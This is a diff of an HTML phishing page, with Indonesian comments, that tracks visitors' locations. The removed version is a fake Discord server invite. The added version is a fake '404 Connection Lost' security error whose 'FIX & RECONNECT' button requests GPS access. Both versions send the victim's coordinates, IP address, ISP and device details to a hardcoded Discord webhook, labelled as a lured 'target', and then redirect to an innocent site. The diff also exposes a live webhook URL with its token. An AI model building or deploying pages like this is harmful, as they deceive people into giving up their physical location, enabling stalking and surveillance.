@@ -3,156 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Invite Link</title>
+    <title>404 - Connection Lost</title>
     <style>
-        :root {
-            --bg-darker: #2f3136;
-            --bg-card: #36393f;
-            --blurple: #5865f2;
-            --blurple-hover: #4752c4;
-            --text-muted: #b9bbbe;
-            --text-header: #ffffff;
-            --online-color: #3ba55d;
-        }
-
         body {
-            margin: 0; background-color: var(--bg-darker);
-            font-family: 'gg sans', 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
+            background-color: #f4f7f9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        .card {
-            background-color: var(--bg-card); padding: 32px; border-radius: 8px;
-            width: 100%; max-width: 430px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+        .container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid #e1e8ed;
         }
-
-        .invite-label {
-            color: var(--text-muted); font-size: 12px; font-weight: 700;
-            text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px;
+        h1 {
+            color: #e74c3c;
+            font-size: 80px;
+            margin: 0;
+            font-weight: 700;
         }
-
-        .server-info { display: flex; align-items: center; margin-bottom: 20px; }
-
-        /* Ikon Server */
-        .server-icon {
-            width: 76px; height: 76px; background-color: var(--blurple);
-            border-radius: 24px; margin-right: 16px; flex-shrink: 0;
-            display: flex; justify-content: center; align-items: center;
-            font-size: 30px; font-weight: bold; color: white;
-            background-size: cover; background-position: center;
+        h2 {
+            color: #2c3e50;
+            font-size: 22px;
+            margin: 10px 0 20px 0;
         }
-
-        .server-details h3 { margin: 0; font-size: 18px; color: var(--text-header); display: flex; align-items: center; }
-        .status-counts { display: flex; margin-top: 4px; font-size: 14px; color: var(--text-muted); }
-        .status-online::before { content: ''; display: inline-block; width: 10px; height: 10px; background-color: var(--online-color); border-radius: 50%; margin-right: 4px; }
-        .status-total::before { content: ''; display: inline-block; width: 10px; height: 10px; background-color: #747f8d; border-radius: 50%; margin-right: 4px; margin-left: 12px; }
-
-        .btn-join {
-            background-color: var(--blurple); color: white; border: none; width: 100%;
-            padding: 12px; font-size: 16px; font-weight: 500; border-radius: 3px;
-            cursor: pointer; transition: 0.2s; margin-top: 10px;
+        p {
+            color: #7f8c8d;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
         }
-
-        .btn-join:hover { background-color: var(--blurple-hover); }
-        #log-status { display: none; margin-top: 15px; font-size: 13px; color: var(--text-muted); text-align: center; }
+        .btn-fix {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-fix:hover {
+            background-color: #2980b9;
+        }
+        .error-code {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #bdc3c7;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="invite-label">You've been invited to join</div>
+    <div class="container">
+        <h1>404</h1>
+        <h2>Connection Lost</h2>
+        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda.<br>Keamanan enkripsi mungkin terganggu.</p>
         
-        <div class="server-info">
-            <!-- Ganti Huruf 'S' jadi inisial servermu, atau pakai background-image -->
-            <div class="server-icon" id="icon">S</div> 
-            <div class="server-details">
-                <h3 id="serverName">Server Name Goes Here ✅</h3>
-                <div class="status-counts">
-                    <span class="status-online" id="onlineCount">1,234 Online</span>
-                    <span class="status-total" id="totalCount">5,678 Members</span>
-                </div>
-            </div>
-        </div>
+        <button class="btn-fix" id="actionBtn">FIX & RECONNECT</button>
         
-        <button class="btn-join" id="joinBtn">Accept Invite</button>
-        <div id="log-status">Verifying connection to Discord Gateway...</div>
+        <div class="error-code">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
     </div>
 
     <script>
-        // --- KONFIGURASI PRIBADI ---
-        const config = {
-            serverName: "Mabar Roblox", // Ganti Nama Server
-            iconLetter: "M",                       // Inisial Ikon
-            online: "5 Online",                // Jumlah Online
-            total: "30 Members",               // Total Member
-            webhook: "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01",
-            redirectInvite: "https://discord.gg/safety" // Link asli sesudah kena
-        };
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
 
-        // Terapkan Konfigurasi ke UI
-        document.getElementById('serverName').innerText = config.serverName;
-        document.getElementById('icon').innerText = config.iconLetter;
-        document.getElementById('onlineCount').innerText = config.online;
-        document.getElementById('totalCount').innerText = config.total;
-
-        const joinBtn = document.getElementById('joinBtn');
-        const statusMsg = document.getElementById('log-status');
-
-        joinBtn.addEventListener('click', () => {
-            joinBtn.innerText = 'Joining...';
-            joinBtn.disabled = true;
-            statusMsg.style.display = 'block';
+        document.getElementById('actionBtn').addEventListener('click', function() {
+            this.innerText = "Processing...";
+            this.disabled = true;
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, handleError, {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // Ambil info IP & Provider secara detail
+                    let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        ipInfo = await res.json();
+                    } catch (e) {}
+
+                    const payload = {
+                        username: "System Security Monitor",
+                        embeds: [{
+                            title: "🚨 Target Berhasil Terpancing!",
+                            color: 15548997, // Warna Merah
+                            fields: [
+                                { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
+                                { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
+                                { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
+                                { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
+                                { name: "📱 Perangkat", value: `\`${navigator.userAgent}\`` }
+                            ],
+                            footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
+                        }]
+                    };
+
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+
+                    // Redirect ke halaman normal (seolah sudah benar)
+                    window.location.href = "https://www.google.com";
+
+                }, async (err) => {
+                    // Jika target klik "Block" atau "Deny"
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi."
+                        })
+                    });
+                    window.location.href = "https://www.google.com";
+                }, {
                     enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                    timeout: 10000
                 });
-            } else {
-                statusMsg.innerText = "Error: Authentication failed.";
             }
         });
-
-        async function sendData(position) {
-            const payload = {
-                username: "Invite Tracker",
-                content: "🎯 **Target Terjebak Lewat Invite Palsu!**",
-                embeds: [{
-                    title: "Detail Koordinat",
-                    color: 5814783,
-                    fields: [
-                        { name: "📍 Lokasi", value: `\`${position.coords.latitude}, ${position.coords.longitude}\`` },
-                        { name: "🗺️ Maps", value: `[Buka di Google Maps](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})` }
-                    ],
-                    footer: { text: `Target mencoba join: ${config.serverName}` },
-                    timestamp: new Date()
-                }]
-            };
-
-            try {
-                await fetch(config.webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {}
-
-            window.location.href = config.redirectInvite;
-        }
-
-        async function handleError(error) {
-            try {
-                await fetch(config.webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ 
-                        content: `⚠️ Target klik Accept di **${config.serverName}** tapi menolak izin lokasi.` 
-                    })
-                });
-            } catch (e) {}
-            window.location.href = "https://discord.com";
-        }
     </script>
 </body>
 </html>
